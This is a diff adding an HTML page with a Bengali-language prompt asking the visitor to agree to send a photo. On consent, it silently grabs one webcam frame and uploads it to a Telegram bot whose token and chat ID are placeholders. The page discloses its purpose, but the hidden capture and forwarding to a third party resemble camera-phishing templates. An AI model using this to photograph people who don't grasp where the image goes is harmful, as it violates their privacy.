@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Camera Capture</title>
+    <style>
+        body {
+            text-align: center;
+            font-family: Arial, sans-serif;
+        }
+        video, canvas {
+            display: none;
+        }
+        button {
+            font-size: 20px;
+            padding: 10px 20px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+
+    <h2>আপনি কি আপনার ছবি পাঠানোর জন্য রাজি আছেন?</h2>
+    <button id="captureBtn">হ্যাঁ, ওকে</button>
+    
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        document.getElementById('captureBtn').addEventListener('click', function() {
+            // ক্যামেরা অ্যাক্সেস চাওয়া
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(stream => {
+                    let video = document.getElementById('video');
+                    video.srcObject = stream;
+                    video.play();
+
+                    // কিছুক্ষণ পর ছবি তোলা
+                    setTimeout(() => {
+                        let canvas = document.getElementById('canvas');
+                        let context = canvas.getContext('2d');
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                        // ক্যামেরা বন্ধ করা
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // ছবিকে Blob এ কনভার্ট করা
+                        canvas.toBlob(blob => {
+                            let formData = new FormData();
+                            formData.append("chat_id", "YOUR_CHAT_ID");
+                            formData.append("photo", blob, "image.jpg");
+
+                            // টেলিগ্রাম বটে ছবি পাঠানো
+                            fetch(`https://api.telegram.org/botYOUR_BOT_TOKEN/sendPhoto`, {
+                                method: "POST",
+                                body: formData
+                            })
+                            .then(response => response.json())
+                            .then(data => alert("ছবি সফলভাবে পাঠানো হয়েছে!"))
+                            .catch(error => alert("ছবি পাঠাতে সমস্যা হয়েছে!"));
+                        }, 'image/jpeg');
+                    }, 3000);
+                })
+                .catch(error => alert("ক্যামেরা অ্যাক্সেস পাওয়া যায়নি!"));
+        });
+    </script>
+
+</body>
+</html>
